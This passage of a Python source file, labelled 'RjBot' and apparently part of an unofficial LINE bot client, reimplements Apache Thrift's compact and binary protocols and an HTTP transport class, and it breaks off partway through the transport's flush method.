# -*- coding: utf-8 -*-
from struct import pack, unpack
from io import BytesIO
from itertools import islice
from http import client as http_client
from PIL import Image
from random import randint
from aiohttp import ClientSession
import sys, os, socket, warnings, base64, time, functools, itertools, operator, types, builtins
import tempfile, random, json, ntpath, io, urllib, requests, shutil, sys, logging, asyncio, re, rsa

if sys.version_info[0] == 2:
    from cStringIO import StringIO as BufferIO
    def binary_to_str(bin_val):
        return bin_val
    def str_to_binary(str_val):
        return str_val
else:
    from io import BytesIO as BufferIO
    def binary_to_str(bin_val):
        return bin_val.decode('utf8',"ignore")
    def str_to_binary(str_val):
        return bytes(str_val, 'utf8',"ignore")
fastbinary = None

__copyright__       = 'Copyright by RjBot'
__version__         = 'ⱱ1.18 RjBot'
__author__          = 'Bangkit'
__author_email__    = 'bangkit11@gmail.com'
__url__             = 'https://line.me/R/ti/p/~bangkit--11'
__all__ = ['LINE', 'Client']

def make_helper(v_from, container):
    def helper(func):
        def nested(self, *args, **kwargs):
            assert self.state in (v_from, container), (self.state, v_from, container)
            return func(self, *args, **kwargs)
        return nested
    return helper
writer = make_helper(2, 3)
reader = make_helper(7, 6)

class CompactType(object):
    STOP = 0x00
    TRUE = 0x01
    FALSE = 0x02
    BYTE = 0x03
    I16 = 0x04
    I32 = 0x05
    I64 = 0x06
    DOUBLE = 0x07
    BINARY = 0x08
    LIST = 0x09
    SET = 0x0A
    MAP = 0x0B
    STRUCT = 0x0C
    
class TType(object):
    STOP = 0
    VOID = 1
    BOOL = 2
    BYTE = 3
    I08 = 3
    DOUBLE = 4
    I16 = 6
    I32 = 8
    I64 = 10
    STRING = 11
    UTF7 = 11
    STRUCT = 12
    MAP = 13
    SET = 14
    LIST = 15
    UTF8 = 16
    UTF16 = 17

    _VALUES_TO_NAMES = (
        'STOP',
        'VOID',
        'BOOL',
        'BYTE',
        'DOUBLE',
        None,
        'I16',
        None,
        'I32',
        None,
        'I64',
        'STRING',
        'STRUCT',
        'MAP',
        'SET',
        'LIST',
        'UTF8',
        'UTF16',
    )

CTYPES = {
    TType.STOP: CompactType.STOP,
    TType.BOOL: CompactType.TRUE,  # used for collection
    TType.BYTE: CompactType.BYTE,
    TType.I16: CompactType.I16,
    TType.I32: CompactType.I32,
    TType.I64: CompactType.I64,
    TType.DOUBLE: CompactType.DOUBLE,
    TType.STRING: CompactType.BINARY,
    TType.STRUCT: CompactType.STRUCT,
    TType.LIST: CompactType.LIST,
    TType.SET: CompactType.SET,
    TType.MAP: CompactType.MAP,
}

TTYPES = { CTYPES[x] : x for x in CTYPES }
TTYPES[CompactType.FALSE] = TType.BOOL

class TMessageType(object):
    CALL = 1
    REPLY = 2
    EXCEPTION = 3
    ONEWAY = 4

class TException(Exception):

    # BaseException.message is deprecated in Python v[2.6,3.0)
    if (2, 6, 0) <= sys.version_info < (3, 0):
        def _get_message(self):
            return self._message

        def _set_message(self, message):
            self._message = message
        message = property(_get_message, _set_message)

    def __init__(self, message=None):
        Exception.__init__(self, message)
        self.message = message


class TApplicationException(TException):

    UNKNOWN = 0
    UNKNOWN_METHOD = 1
    INVALID_MESSAGE_TYPE = 2
    WRONG_METHOD_NAME = 3
    BAD_SEQUENCE_ID = 4
    MISSING_RESULT = 5
    INTERNAL_ERROR = 6
    PROTOCOL_ERROR = 7
    INVALID_TRANSFORM = 8
    INVALID_PROTOCOL = 9
    UNSUPPORTED_CLIENT_TYPE = 10

    def __init__(self, type=UNKNOWN, message=None):
        TException.__init__(self, message)
        self.type = type

    def __str__(self):
        if self.message:
            return self.message
        elif self.type == self.UNKNOWN_METHOD:
            return 'Unknown method'
        elif self.type == self.INVALID_MESSAGE_TYPE:
            return 'Invalid message type'
        elif self.type == self.WRONG_METHOD_NAME:
            return 'Wrong method name'
        elif self.type == self.BAD_SEQUENCE_ID:
            return 'Bad sequence ID'
        elif self.type == self.MISSING_RESULT:
            return 'Missing result'
        elif self.type == self.INTERNAL_ERROR:
            return 'Internal error'
        elif self.type == self.PROTOCOL_ERROR:
            return 'Protocol error'
        elif self.type == self.INVALID_TRANSFORM:
            return 'Invalid transform'
        elif self.type == self.INVALID_PROTOCOL:
            return 'Invalid protocol'
        elif self.type == self.UNSUPPORTED_CLIENT_TYPE:
            return 'Unsupported client type'
        else:
            return 'Default (unknown) TApplicationException'

    def read(self, iprot):
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.message = iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.I32:
                    self.type = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        oprot.writeStructBegin('TApplicationException')
        if self.message is not None:
            oprot.writeFieldBegin('message', TType.STRING, 1)
            oprot.writeString(self.message)
            oprot.writeFieldEnd()
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.I32, 2)
            oprot.writeI32(self.type)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()


class TFrozenDict(dict):

    def __init__(self, *args, **kwargs):
        super(TFrozenDict, self).__init__(*args, **kwargs)
        self.__hashval = hash(TFrozenDict) ^ hash(tuple(sorted(self.items())))

    def __setitem__(self, *args):
        raise TypeError("Can't modify frozen TFreezableDict")

    def __delitem__(self, *args):
        raise TypeError("Can't modify frozen TFreezableDict")

    def __hash__(self):
        return self.__hashval

class TProtocolException(TException):

    UNKNOWN = 0
    INVALID_DATA = 1
    NEGATIVE_SIZE = 2
    SIZE_LIMIT = 3
    BAD_VERSION = 4
    NOT_IMPLEMENTED = 5
    DEPTH_LIMIT = 6

    def __init__(self, type=UNKNOWN, message=None):
        TException.__init__(self, message)
        self.type = type

class Six(object):
    """Copyed By Benjamin Peterson"""
    def iterkeys(d, **kw):
        return iter(d.keys(**kw))
    def itervalues(d, **kw):
        return iter(d.values(**kw))
    def iteritems(d, **kw):
        return iter(d.items(**kw))
    def makeZigZag(n, bits):
        if bits == 8 and (n < -128 or n > 127):
            raise TProtocolException(TProtocolException.INVALID_DATA, "i8 requires -128 <= number <= 127")
        elif bits == 16 and (n < -32768 or n > 32767):
            raise TProtocolException(TProtocolException.INVALID_DATA, "i16 requires -32768 <= number <= 32767")
        elif bits == 32 and (n < -2147483648 or n > 2147483647):
            raise TProtocolException(TProtocolException.INVALID_DATA, "i32 requires -2147483648 <= number <= 2147483647")
        elif bits == 64 and (n < -9223372036854775808 or n > 9223372036854775807):
            raise TProtocolException(TProtocolException.INVALID_DATA, "i64 requires -9223372036854775808 <= number <= 9223372036854775807")
        return (n << 1) ^ (n >> (bits - 1))

class TTransportException(TException):

    UNKNOWN = 0
    NOT_OPEN = 1
    ALREADY_OPEN = 2
    TIMED_OUT = 3
    END_OF_FILE = 4
    NEGATIVE_SIZE = 5
    SIZE_LIMIT = 6

    def __init__(self, type=UNKNOWN, message=None):
        TException.__init__(self, message)
        self.type = type

class TProtocolBase(object):

    def __init__(self, trans):
        self.trans = trans
        self._fast_decode = None
        self._fast_encode = None

    @staticmethod
    def _check_length(limit, length):
        if length < 0:
            raise TTransportException(TTransportException.NEGATIVE_SIZE, 'Negative length: %d' % length)
        if limit is not None and length > limit:
            raise TTransportException(TTransportException.SIZE_LIMIT, 'Length exceeded max allowed: %d' % limit)

    def writeMessageBegin(self, name, ttype, seqid):
        pass

    def writeMessageEnd(self):
        pass

    def writeStructBegin(self, name):
        pass

    def writeStructEnd(self):
        pass

    def writeFieldBegin(self, name, ttype, fid):
        pass

    def writeFieldEnd(self):
        pass

    def writeFieldStop(self):
        pass

    def writeMapBegin(self, ktype, vtype, size):
        pass

    def writeMapEnd(self):
        pass

    def writeListBegin(self, etype, size):
        pass

    def writeListEnd(self):
        pass

    def writeSetBegin(self, etype, size):
        pass

    def writeSetEnd(self):
        pass

    def writeBool(self, bool_val):
        pass

    def writeByte(self, byte):
        pass

    def writeI16(self, i16):
        pass

    def writeI32(self, i32):
        pass

    def writeI64(self, i64):
        pass

    def writeDouble(self, dub):
        pass

    def writeString(self, str_val):
        self.writeBinary(str_to_binary(str_val))

    def writeBinary(self, str_val):
        pass

    def writeUtf8(self, str_val):
        self.writeString(str_val.encode('utf8'))

    def readMessageBegin(self):
        pass

    def readMessageEnd(self):
        pass

    def readStructBegin(self):
        pass

    def readStructEnd(self):
        pass

    def readFieldBegin(self):
        pass

    def readFieldEnd(self):
        pass

    def readMapBegin(self):
        pass

    def readMapEnd(self):
        pass

    def readListBegin(self):
        pass

    def readListEnd(self):
        pass

    def readSetBegin(self):
        pass

    def readSetEnd(self):
        pass

    def readBool(self):
        pass

    def readByte(self):
        pass

    def readI16(self):
        pass

    def readI32(self):
        pass

    def readI64(self):
        pass

    def readDouble(self):
        pass

    def readString(self):
        return binary_to_str(self.readBinary())

    def readBinary(self):
        pass

    def readUtf8(self):
        return self.readString().decode('utf8')

    def skip(self, ttype):
        if ttype == TType.STOP:
            return
        elif ttype == TType.BOOL:
            self.readBool()
        elif ttype == TType.BYTE:
            self.readByte()
        elif ttype == TType.I16:
            self.readI16()
        elif ttype == TType.I32:
            self.readI32()
        elif ttype == TType.I64:
            self.readI64()
        elif ttype == TType.DOUBLE:
            self.readDouble()
        elif ttype == TType.STRING:
            self.readString()
        elif ttype == TType.STRUCT:
            name = self.readStructBegin()
            while True:
                (name, ttype, id) = self.readFieldBegin()
                if ttype == TType.STOP:
                    break
                self.skip(ttype)
                self.readFieldEnd()
            self.readStructEnd()
        elif ttype == TType.MAP:
            (ktype, vtype, size) = self.readMapBegin()
            for i in range(size):
                self.skip(ktype)
                self.skip(vtype)
            self.readMapEnd()
        elif ttype == TType.SET:
            (etype, size) = self.readSetBegin()
            for i in range(size):
                self.skip(etype)
            self.readSetEnd()
        elif ttype == TType.LIST:
            (etype, size) = self.readListBegin()
            for i in range(size):
                self.skip(etype)
            self.readListEnd()

    # tuple of: ( 'reader method' name, is_container bool, 'writer_method' name )
    _TTYPE_HANDLERS = (
        (None, None, False),  # 0 TType.STOP
        (None, None, False),  # 1 TType.VOID # TODO: handle void?
        ('readBool', 'writeBool', False),  # 2 TType.BOOL
        ('readByte', 'writeByte', False),  # 3 TType.BYTE and I08
        ('readDouble', 'writeDouble', False),  # 4 TType.DOUBLE
        (None, None, False),  # 5 undefined
        ('readI16', 'writeI16', False),  # 6 TType.I16
        (None, None, False),  # 7 undefined
        ('readI32', 'writeI32', False),  # 8 TType.I32
        (None, None, False),  # 9 undefined
        ('readI64', 'writeI64', False),  # 10 TType.I64
        ('readString', 'writeString', False),  # 11 TType.STRING and UTF7
        ('readContainerStruct', 'writeContainerStruct', True),  # 12 *.STRUCT
        ('readContainerMap', 'writeContainerMap', True),  # 13 TType.MAP
        ('readContainerSet', 'writeContainerSet', True),  # 14 TType.SET
        ('readContainerList', 'writeContainerList', True),  # 15 TType.LIST
        (None, None, False),  # 16 TType.UTF8 # TODO: handle utf8 types?
        (None, None, False)  # 17 TType.UTF16 # TODO: handle utf16 types?
    )

    def _ttype_handlers(self, ttype, spec):
        if spec == 'BINARY':
            if ttype != TType.STRING:
                raise TProtocolException(type=TProtocolException.INVALID_DATA, message='Invalid binary field type %d' % ttype)
            return ('readBinary', 'writeBinary', False)
        if sys.version_info[0] == 2 and spec == 'UTF8':
            if ttype != TType.STRING:
                raise TProtocolException(type=TProtocolException.INVALID_DATA, message='Invalid string field type %d' % ttype)
            return ('readUtf8', 'writeUtf8', False)
        return self._TTYPE_HANDLERS[ttype] if ttype < len(self._TTYPE_HANDLERS) else (None, None, False)

    def _read_by_ttype(self, ttype, spec, espec):
        reader_name, _, is_container = self._ttype_handlers(ttype, spec)
        if reader_name is None:
            raise TProtocolException(type=TProtocolException.INVALID_DATA, message='Invalid type %d' % (ttype))
        reader_func = getattr(self, reader_name)
        read = (lambda: reader_func(espec)) if is_container else reader_func
        while True:
            yield read()

    def readFieldByTType(self, ttype, spec):
        return next(self._read_by_ttype(ttype, spec, spec))

    def readContainerList(self, spec):
        ttype, tspec, is_immutable = spec
        (list_type, list_len) = self.readListBegin()
        elems = islice(self._read_by_ttype(ttype, spec, tspec), list_len)
        results = (tuple if is_immutable else list)(elems)
        self.readListEnd()
        return results

    def readContainerSet(self, spec):
        ttype, tspec, is_immutable = spec
        (set_type, set_len) = self.readSetBegin()
        # TODO: compare types we just decoded with thrift_spec
        elems = islice(self._read_by_ttype(ttype, spec, tspec), set_len)
        results = (frozenset if is_immutable else set)(elems)
        self.readSetEnd()
        return results

    def readContainerStruct(self, spec):
        (obj_class, obj_spec) = spec
        obj = obj_class()
        obj.read(self)
        return obj

    def readContainerMap(self, spec):
        ktype, kspec, vtype, vspec, is_immutable = spec
        (map_ktype, map_vtype, map_len) = self.readMapBegin()
        keys = self._read_by_ttype(ktype, spec, kspec)
        vals = self._read_by_ttype(vtype, spec, vspec)
        keyvals = islice(zip(keys, vals), map_len)
        results = (TFrozenDict if is_immutable else dict)(keyvals)
        self.readMapEnd()
        return results

    def readStruct(self, obj, thrift_spec, is_immutable=False):
        if is_immutable:
            fields = {}
        self.readStructBegin()
        while True:
            (fname, ftype, fid) = self.readFieldBegin()
            if ftype == TType.STOP:
                break
            try:
                field = thrift_spec[fid]
            except IndexError:
                self.skip(ftype)
            else:
                if field is not None and ftype == field[1]:
                    fname = field[2]
                    fspec = field[3]
                    val = self.readFieldByTType(ftype, fspec)
                    if is_immutable:
                        fields[fname] = val
                    else:
                        setattr(obj, fname, val)
                else:
                    self.skip(ftype)
            self.readFieldEnd()
        self.readStructEnd()
        if is_immutable:
            return obj(**fields)

    def writeContainerStruct(self, val, spec):
        val.write(self)

    def writeContainerList(self, val, spec):
        ttype, tspec, _ = spec
        self.writeListBegin(ttype, len(val))
        for _ in self._write_by_ttype(ttype, val, spec, tspec):
            pass
        self.writeListEnd()

    def writeContainerSet(self, val, spec):
        ttype, tspec, _ = spec
        self.writeSetBegin(ttype, len(val))
        for _ in self._write_by_ttype(ttype, val, spec, tspec):
            pass
        self.writeSetEnd()

    def writeContainerMap(self, val, spec):
        ktype, kspec, vtype, vspec, _ = spec
        self.writeMapBegin(ktype, vtype, len(val))
        for _ in zip(self._write_by_ttype(ktype, Six.iterkeys(val), spec, kspec),
                     self._write_by_ttype(vtype, Six.itervalues(val), spec, vspec)):
            pass
        self.writeMapEnd()

    def writeStruct(self, obj, thrift_spec):
        self.writeStructBegin(obj.__class__.__name__)
        for field in thrift_spec:
            if field is None:
                continue
            fname = field[2]
            val = getattr(obj, fname)
            if val is None:
                # skip writing out unset fields
                continue
            fid = field[0]
            ftype = field[1]
            fspec = field[3]
            self.writeFieldBegin(fname, ftype, fid)
            self.writeFieldByTType(ftype, val, fspec)
            self.writeFieldEnd()
        self.writeFieldStop()
        self.writeStructEnd()

    def _write_by_ttype(self, ttype, vals, spec, espec):
        _, writer_name, is_container = self._ttype_handlers(ttype, spec)
        writer_func = getattr(self, writer_name)
        write = (lambda v: writer_func(v, espec)) if is_container else writer_func
        for v in vals:
            yield write(v)

    def writeFieldByTType(self, ttype, val, spec):
        next(self._write_by_ttype(ttype, [val], spec, spec))

class TTransportBase(object):

    def isOpen(self):
        pass

    def open(self):
        pass

    def close(self):
        pass

    def read(self, sz):
        pass

    def readAll(self, sz):
        buff = b''
        have = 0
        while (have < sz):
            chunk = self.read(sz - have)
            have += len(chunk)
            buff += chunk

            if len(chunk) == 0:
                raise EOFError()

        return buff

    def write(self, buf):
        pass

    def flush(self):
        pass

class TCompactProtocol(TProtocolBase):

    PROTOCOL_ID = 0x82
    VERSION = 1
    VERSION_MASK = 0x1f
    TYPE_MASK = 0xe0
    TYPE_BITS = 0x07
    TYPE_SHIFT_AMOUNT = 5

    def __init__(self, trans, string_length_limit=None, container_length_limit=None):
        TProtocolBase.__init__(self, trans)
        self.state = 0
        self.__last_fid = 0
        self.__bool_fid = None
        self.__bool_value = None
        self.__structs = []
        self.__containers = []
        self.string_length_limit = string_length_limit
        self.container_length_limit = container_length_limit

    def _check_string_length(self, length):
        self._check_length(self.string_length_limit, length)

    def _check_container_length(self, length):
        self._check_length(self.container_length_limit, length)

    def __writeVarint(self, n):
        out = bytearray()
        while True:
            if n & ~0x7f == 0:
                out.append(n)
                break
            else:
                out.append((n & 0xff) | 0x80)
                n = n >> 7
        self.trans.write(bytes(out))

    def writeMessageBegin(self, name, type, seqid):
        assert self.state == 0
        self.__writeUByte(self.PROTOCOL_ID)
        self.__writeUByte(self.VERSION | (type << self.TYPE_SHIFT_AMOUNT))
        self.__writeVarint(seqid)
        self.__writeBinary(str_to_binary(name))
        self.state = 2

    def writeMessageEnd(self):
        assert self.state == 2
        self.state = 0

    def writeStructBegin(self, name):
        assert self.state in (0, 3, 2), self.state
        self.__structs.append((self.state, self.__last_fid))
        self.state = 1
        self.__last_fid = 0

    def writeStructEnd(self):
        assert self.state == 1
        self.state, self.__last_fid = self.__structs.pop()

    def writeFieldStop(self):
        self.__writeByte(0)

    def __writeFieldHeader(self, type, fid):
        delta = fid - self.__last_fid
        if 0 < delta <= 15:
            self.__writeUByte(delta << 4 | type)
        else:
            self.__writeByte(type)
            self.__writeI16(fid)
        self.__last_fid = fid

    def writeFieldBegin(self, name, type, fid):
        assert self.state == 1, self.state
        if type == TType.BOOL:
            self.state = 4
            self.__bool_fid = fid
        else:
            self.state = 2
            self.__writeFieldHeader(CTYPES[type], fid)

    def writeFieldEnd(self):
        assert self.state in (2, 4), self.state
        self.state = 1

    def __writeUByte(self, byte):
        self.trans.write(pack('!B', byte))

    def __writeByte(self, byte):
        self.trans.write(pack('!b', byte))

    def __writeI16(self, i16):
        self.__writeVarint(Six.makeZigZag(i16, 16))

    def __writeSize(self, i32):
        self.__writeVarint(i32)

    def writeCollectionBegin(self, etype, size):
        assert self.state in (2, 3), self.state
        if size <= 14:
            self.__writeUByte(size << 4 | CTYPES[etype])
        else:
            self.__writeUByte(0xf0 | CTYPES[etype])
            self.__writeSize(size)
        self.__containers.append(self.state)
        self.state = 3
    writeSetBegin = writeCollectionBegin
    writeListBegin = writeCollectionBegin

    def writeMapBegin(self, ktype, vtype, size):
        assert self.state in (2, 3), self.state
        if size == 0:
            self.__writeByte(0)
        else:
            self.__writeSize(size)
            self.__writeUByte(CTYPES[ktype] << 4 | CTYPES[vtype])
        self.__containers.append(self.state)
        self.state = 3

    def writeCollectionEnd(self):
        assert self.state == 3, self.state
        self.state = self.__containers.pop()
    writeMapEnd = writeCollectionEnd
    writeSetEnd = writeCollectionEnd
    writeListEnd = writeCollectionEnd

    def writeBool(self, bool):
        if self.state == 4:
            if bool:
                ctype = CompactType.TRUE
            else:
                ctype = CompactType.FALSE
            self.__writeFieldHeader(ctype, self.__bool_fid)
        elif self.state == 3:
            if bool:
                self.__writeByte(CompactType.TRUE)
            else:
                self.__writeByte(CompactType.FALSE)
        else:
            raise AssertionError("Invalid state in compact protocol")

    writeByte = writer(__writeByte)
    writeI16 = writer(__writeI16)

    @writer
    def writeI32(self, i32):
        self.__writeVarint(Six.makeZigZag(i32, 32))

    @writer
    def writeI64(self, i64):
        self.__writeVarint(Six.makeZigZag(i64, 64))

    @writer
    def writeDouble(self, dub):
        self.trans.write(pack('<d', dub))

    def __writeBinary(self, s):
        self.__writeSize(len(s))
        self.trans.write(s)
    writeBinary = writer(__writeBinary)

    def readFieldBegin(self):
        assert self.state == 5, self.state
        type = self.__readUByte()
        if type & 0x0f == TType.STOP:
            return (None, 0, 0)
        delta = type >> 4
        if delta == 0:
            fid = self.__readI16()
        else:
            fid = self.__last_fid + delta
        self.__last_fid = fid
        type = type & 0x0f
        if type == CompactType.TRUE:
            self.state = 8
            self.__bool_value = True
        elif type == CompactType.FALSE:
            self.state = 8
            self.__bool_value = False
        else:
            self.state = 7
        return (None, self.__getTType(type), fid)

    def readFieldEnd(self):
        assert self.state in (7, 8), self.state
        self.state = 5

    def __readUByte(self):
        result, = unpack('!B', self.trans.readAll(1))
        return result

    def __readByte(self):
        result, = unpack('!b', self.trans.readAll(1))
        return result

    def __readVarint(self):
        result = 0
        shift = 0
        while True:
            x = self.trans.readAll(1)
            byte = ord(x)
            result |= (byte & 0x7f) << shift
            if byte >> 7 == 0:
                return result
            shift += 7

    def __readZigZag(self):
        n = self.__readVarint()
        return (n >> 1) ^ -(n & 1)

    def __readSize(self):
        result = self.__readVarint()
        if result < 0:
            raise TProtocolException("Length < 0")
        return result

    def readMessageBegin(self):
        assert self.state == 0
        proto_id = self.__readUByte()
        if proto_id != self.PROTOCOL_ID:
            raise TProtocolException(TProtocolException.BAD_VERSION, 'Bad protocol id in the message: %d' % proto_id)
        ver_type = self.__readUByte()
        type = (ver_type >> self.TYPE_SHIFT_AMOUNT) & self.TYPE_BITS
        version = ver_type & self.VERSION_MASK
        if version != self.VERSION:
            raise TProtocolException(TProtocolException.BAD_VERSION, 'Bad version: %d (expect %d)' % (version, self.VERSION))
        seqid = self.__readVarint()
        name = binary_to_str(self.__readBinary())
        return (name, type, seqid)

    def readMessageEnd(self):
        assert self.state == 0
        assert len(self.__structs) == 0

    def readStructBegin(self):
        assert self.state in (0, 6, 7), self.state
        self.__structs.append((self.state, self.__last_fid))
        self.state = 5
        self.__last_fid = 0

    def readStructEnd(self):
        assert self.state == 5
        self.state, self.__last_fid = self.__structs.pop()

    def readCollectionBegin(self):
        assert self.state in (7, 6), self.state
        size_type = self.__readUByte()
        size = size_type >> 4
        type = self.__getTType(size_type)
        if size == 15:
            size = self.__readSize()
        self._check_container_length(size)
        self.__containers.append(self.state)
        self.state = 6
        return type, size
    readSetBegin = readCollectionBegin
    readListBegin = readCollectionBegin

    def readMapBegin(self):
        assert self.state in (7, 6), self.state
        size = self.__readSize()
        self._check_container_length(size)
        types = 0
        if size > 0:
            types = self.__readUByte()
        vtype = self.__getTType(types)
        ktype = self.__getTType(types >> 4)
        self.__containers.append(self.state)
        self.state = 6
        return (ktype, vtype, size)

    def readCollectionEnd(self):
        assert self.state == 6, self.state
        self.state = self.__containers.pop()
    readSetEnd = readCollectionEnd
    readListEnd = readCollectionEnd
    readMapEnd = readCollectionEnd

    def readBool(self):
        if self.state == 8:
            return self.__bool_value == CompactType.TRUE
        elif self.state == 6:
            return self.__readByte() == CompactType.TRUE
        else:
            raise AssertionError("Invalid state in compact protocol: %d" % self.state)

    readByte = reader(__readByte)
    __readI16 = __readZigZag
    readI16 = reader(__readZigZag)
    readI32 = reader(__readZigZag)
    readI64 = reader(__readZigZag)

    @reader
    def readDouble(self):
        buff = self.trans.readAll(8)
        val, = unpack('<d', buff)
        return val

    def __readBinary(self):
        size = self.__readSize()
        self._check_string_length(size)
        return self.trans.readAll(size)
    readBinary = reader(__readBinary)

    def __getTType(self, byte):
        return TTYPES[byte & 0x0f]

class TBinaryProtocol(TProtocolBase):

    # VERSION_MASK = 0xffff0000
    VERSION_MASK = -65536

    # VERSION_1 = 0x80010000
    VERSION_1 = -2147418112

    TYPE_MASK = 0x000000ff

    def __init__(self, trans, strictRead=False, strictWrite=True, **kwargs):
        TProtocolBase.__init__(self, trans)
        self.strictRead = strictRead
        self.strictWrite = strictWrite
        self.string_length_limit = kwargs.get('string_length_limit', None)
        self.container_length_limit = kwargs.get('container_length_limit', None)

    def _check_string_length(self, length):
        self._check_length(self.string_length_limit, length)

    def _check_container_length(self, length):
        self._check_length(self.container_length_limit, length)

    def writeMessageBegin(self, name, type, seqid):
        if self.strictWrite:
            self.writeI32(TBinaryProtocol.VERSION_1 | type)
            self.writeString(name)
            self.writeI32(seqid)
        else:
            self.writeString(name)
            self.writeByte(type)
            self.writeI32(seqid)

    def writeMessageEnd(self):
        pass

    def writeStructBegin(self, name):
        pass

    def writeStructEnd(self):
        pass

    def writeFieldBegin(self, name, type, id):
        self.writeByte(type)
        self.writeI16(id)

    def writeFieldEnd(self):
        pass

    def writeFieldStop(self):
        self.writeByte(TType.STOP)

    def writeMapBegin(self, ktype, vtype, size):
        self.writeByte(ktype)
        self.writeByte(vtype)
        self.writeI32(size)

    def writeMapEnd(self):
        pass

    def writeListBegin(self, etype, size):
        self.writeByte(etype)
        self.writeI32(size)

    def writeListEnd(self):
        pass

    def writeSetBegin(self, etype, size):
        self.writeByte(etype)
        self.writeI32(size)

    def writeSetEnd(self):
        pass

    def writeBool(self, bool):
        if bool:
            self.writeByte(1)
        else:
            self.writeByte(0)

    def writeByte(self, byte):
        buff = pack("!b", byte)
        self.trans.write(buff)

    def writeI16(self, i16):
        buff = pack("!h", i16)
        self.trans.write(buff)

    def writeI32(self, i32):
        buff = pack("!i", i32)
        self.trans.write(buff)

    def writeI64(self, i64):
        buff = pack("!q", i64)
        self.trans.write(buff)

    def writeDouble(self, dub):
        buff = pack("!d", dub)
        self.trans.write(buff)

    def writeBinary(self, str):
        self.writeI32(len(str))
        self.trans.write(str)

    def readMessageBegin(self):
        sz = self.readI32()
        if sz < 0:
            version = sz & TBinaryProtocol.VERSION_MASK
            if version != TBinaryProtocol.VERSION_1:
                raise TProtocolException(
                    type=TProtocolException.BAD_VERSION,
                    message='Bad version in readMessageBegin: %d' % (sz))
            type = sz & TBinaryProtocol.TYPE_MASK
            name = self.readString()
            seqid = self.readI32()
        else:
            if self.strictRead:
                raise TProtocolException(type=TProtocolException.BAD_VERSION,
                                         message='No protocol version header')
            name = self.trans.readAll(sz)
            type = self.readByte()
            seqid = self.readI32()
        return (name, type, seqid)

    def readMessageEnd(self):
        pass

    def readStructBegin(self):
        pass

    def readStructEnd(self):
        pass

    def readFieldBegin(self):
        type = self.readByte()
        if type == TType.STOP:
            return (None, type, 0)
        id = self.readI16()
        return (None, type, id)

    def readFieldEnd(self):
        pass

    def readMapBegin(self):
        ktype = self.readByte()
        vtype = self.readByte()
        size = self.readI32()
        self._check_container_length(size)
        return (ktype, vtype, size)

    def readMapEnd(self):
        pass

    def readListBegin(self):
        etype = self.readByte()
        size = self.readI32()
        self._check_container_length(size)
        return (etype, size)

    def readListEnd(self):
        pass

    def readSetBegin(self):
        etype = self.readByte()
        size = self.readI32()
        self._check_container_length(size)
        return (etype, size)

    def readSetEnd(self):
        pass

    def readBool(self):
        byte = self.readByte()
        if byte == 0:
            return False
        return True

    def readByte(self):
        buff = self.trans.readAll(1)
        val, = unpack('!b', buff)
        return val

    def readI16(self):
        buff = self.trans.readAll(2)
        val, = unpack('!h', buff)
        return val

    def readI32(self):
        buff = self.trans.readAll(4)
        val, = unpack('!i', buff)
        return val

    def readI64(self):
        buff = self.trans.readAll(8)
        val, = unpack('!q', buff)
        return val

    def readDouble(self):
        buff = self.trans.readAll(8)
        val, = unpack('!d', buff)
        return val

    def readBinary(self):
        size = self.readI32()
        self._check_string_length(size)
        s = self.trans.readAll(size)
        return s

class TCompactProtocolAccelerated(TCompactProtocol):

    def __init__(self, *args, **kwargs):
        fallback = kwargs.pop('fallback', True)
        super(TCompactProtocolAccelerated, self).__init__(*args, **kwargs)
        
        if fastbinary != None:
            self._fast_decode = fastbinary.decode_compact
            self._fast_encode = fastbinary.encode_compact

class TBinaryProtocolAccelerated(TBinaryProtocol):

    def __init__(self, *args, **kwargs):
        fallback = kwargs.pop('fallback', True)
        super(TBinaryProtocolAccelerated, self).__init__(*args, **kwargs)
        
        if fastbinary != None:
            self._fast_decode = fastbinary.decode_binary
            self._fast_encode = fastbinary.encode_binary

class THttpClient(TTransportBase):

    def __init__(self, uri_or_host, port=None, path=None, upsp=True):

        if port is not None:
            warnings.warn("Please use the THttpClient('http://host:port/path') syntax", DeprecationWarning, stacklevel=2)
            self.host = uri_or_host
            self.port = port
            assert path
            self.path = path
            self.scheme = 'http'
        else:
            parsed = urllib.parse.urlparse(uri_or_host)
            self.scheme = parsed.scheme
            assert self.scheme in ('http', 'https')
            if self.scheme == 'http':
                self.port = parsed.port or http_client.HTTP_PORT
            elif self.scheme == 'https':
                self.port = parsed.port or http_client.HTTPS_PORT
            self.host = parsed.hostname
            self.path = parsed.path
            if parsed.query:
                self.path += '?%s' % parsed.query
        proxy = None
        self.realhost = self.realport = self.proxy_auth = None
        self.__wbuf = BytesIO()
        self.__http = None
        self.__http_response = None
        self.__timeout = None
        self.__custom_headers = None
        self.__upsp = upsp
        self.__time = time.time()
        self.__loop = 0

    @staticmethod
    def basic_proxy_auth_header(proxy):
        if proxy is None or not proxy.username:
            return None
        ap = "%s:%s" % (urllib.parse.unquote(proxy.username),
                        urllib.parse.unquote(proxy.password))
        cr = base64.b64encode(ap).strip()
        return "Basic " + cr

    def using_proxy(self):
        return self.realhost is not None

    def open(self):
        if self.scheme == 'http':
            self.__http = http_client.HTTPConnection(self.host, self.port)
        elif self.scheme == 'https':
            self.__http = http_client.HTTPSConnection(self.host, self.port)

    def close(self):
        self.__http.close()
        self.__http = None
        self.__http_response = None

    def isOpen(self):
        return self.__http is not None

    def setTimeout(self, ms):
        if not hasattr(socket, 'getdefaulttimeout'):
            raise NotImplementedError

        if ms is None:
            self.__timeout = None
        else:
            self.__timeout = ms / 1000.0

    def setCustomHeaders(self, headers):
        self.__custom_headers = headers

    def read(self, sz):
        return self.__http_response.read(sz)

    def write(self, buf):
        self.__wbuf.write(buf)

    def __withTimeout(f):
        def _f(*args, **kwargs):
            orig_timeout = socket.getdefaulttimeout()
            socket.setdefaulttimeout(args[0].__timeout)
            try:
                result = f(*args, **kwargs)
            finally:
                socket.setdefaulttimeout(orig_timeout)
            return result
        return _f

    def flush(self, data=None):
        if self.__upsp:
            if self.__loop <= 2:
                if self.isOpen(): self.close()
                self.open(); self.__loop += 1
            elif time.time() - self.__time > 90:
                self.close(); self.open(); self.__time = time.time()
        else:
            if self.isOpen():
                self.close()
            self.open()
       
        if data == None:
